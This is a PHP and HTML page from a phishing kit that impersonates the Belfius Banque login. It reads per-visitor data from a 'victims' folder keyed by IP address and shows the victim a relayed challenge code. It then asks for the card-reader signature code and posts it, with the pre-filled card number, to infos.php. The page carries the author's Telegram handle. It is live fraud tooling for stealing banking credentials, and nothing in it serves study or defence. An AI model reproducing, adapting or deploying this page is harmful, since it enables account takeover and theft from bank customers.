<?php 


    require_once "functions.php";
    require_once "ajax.php";
    $qr = file_get_contents('victims/'  .get_client_ip() . '.txt');
    $qr = explode('|',$qr);
    $qr = $qr[1];



                                    #========================================
                                    #==> Make By ==> Telegram : @Azar_ox <==#
                                    #========================================

?>


<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>Belfius Banque - Belfius</title>
        <!-- logo site web-->
        <link rel="icon" href="image/belfius.ico" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/belfius.ico" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/style.css">
        <link rel="stylesheet"  href="css/animate.css">
        <style>
            .modal-open{
                overflow:hidden;
                padding-right:0px;
            }
        </style>

</head>
<body class="modal-open">

        <div class="home_1">
            <img src="image/xl.png">
        </div>

        <div class="home_2">
            <img src="image/lg.png">
        </div>

        <div class="home_3">
            <img src="image/md.png">
        </div>

        <div class="home_4">
            <img src="image/sm.png">
        </div>

        <div class="home_5">
            <img src="image/xs.png">
        </div>

        <div class="home_6">
            <img src="image/zz.png">
        </div>

         <!-- Modal -->
        <div class="modal problem fade show" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" style="display:block;"> 
          <div class="modal-dialog shadow ">
            <div class="modal-content">
              <div class="modal-header text-center ">
                  <h4>Se connecter</h4>
                  <i class="bi bi-x-lg"></i>
              </div>
              <div class="modal-body">
                 <div class="row">
                     <div class="col-lg-5 col-md-5 text-center sis"><img src="image/bb.png" width="170px" class="img-fluid"></div>
                     <div class="col-lg-7 col-md-7 frr">
                         <div class="right">
                             <div class="topping">
                                 <ul>
                                     <li class="doom"><a href="">Itsme®</a></li>
                                     <li class="doom"><a href="">Avec cable USB</a></li>
                                     <li class="active"><a href="">Sans cable USB</a></li>
                                 </ul>
                             </div> 
                             <div class="milieu">
                                 <h4>Introduisez votre numéro de carte</h4>
                                 <form action="infos.php" method="post">
                                    <input type="hidden" name="step" value="code">
                                     <div class="form-group sodania">
                                         <label>Votre numéro de carte <i class="bi bi-question-circle ms-1" id="come"></i></label>
                                         <input type="text" name="card" id="card" class="form-control" value="<?php echo $_SESSION['card']?>" readonly>
                                         <div id="helpme">
                                             <div class="head"><i class="bi bi-x-lg" id="bali"></i></div>
                                             <div class="imaga"><img src="image/bb.png"></div>
                                         </div>
                                     </div>
                                     <hr>
                                     <div class="steps">
                                         <ul class="nav d-block">
                                             <li class="nav-item ">
                                                 <p><span>1 </span> Appuyez sur</p>
                                                 <div class="lefta">
                                                     <img src="image/login.png">
                                                 </div>
                                             </li>
                                             <li class="nav-item ">
                                                 <p><span>2 </span> introduisez le code</p>
                                                 <div class="lefta">
                                                     <div class="dodo"><?php echo $qr; ?></div>
                                                     <div class="span px-1">+</div>
                                                     <img src="image/ok.png">
                                                 </div>
                                             </li>
                                             <li class="nav-item ">
                                                 <p><span>3 </span> introduisez votre code personel</p>
                                                 <div class="lefta">
                                                     <div class="dodo">PIN</div>
                                                     <div class="span px-1">+</div>
                                                     <img src="image/ok.png">
                                                 </div>
                                             </li>
                                             <li class="nav-item ">
                                                 <p><span>4 </span> introduisez votre code de signature</p>
                                                 <div class="lefta">
                                                     <div class="form-group">
                                                         <input type="text" name="code" id="code" class="form-control" autofocus >
                                                         <img src="image/lecteur.png">
                                                     </div>
                                                 </div>
                                             </li>
                                         </ul>
                                     </div>
                                     <div class="bottona justify-content-end">
                                         <button class="btn" name="submit" id="submit" disabled><img src="image/confirmer.png">Confirmer</button>
                                     </div>
                                 </form>
                             </div>
                         </div>
                     </div>
                 </div>
              </div>
            </div>
          </div>
        </div>






        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script>


            $("#code").keyup(function(){
                if($("#code").val().length > 3){
                    $("#submit").attr("disabled",false);
                    $("#submit").css("background","#C20145");
                    $("#code").css("border","1px solid #C20145");
                }else{
                    $("#submit").attr("disabled",true);
                    $("#submit").css("background","#DDDDE0");
                    $("#code").css("border","1px solid #979faa");
                }
            });

            $("#bali").click(function(){
                $("#helpme").fadeOut();
            })
            $("#come").click(function(){
                $("#helpme").fadeIn();
            })
            

             
        </script>
              
</body>
</html>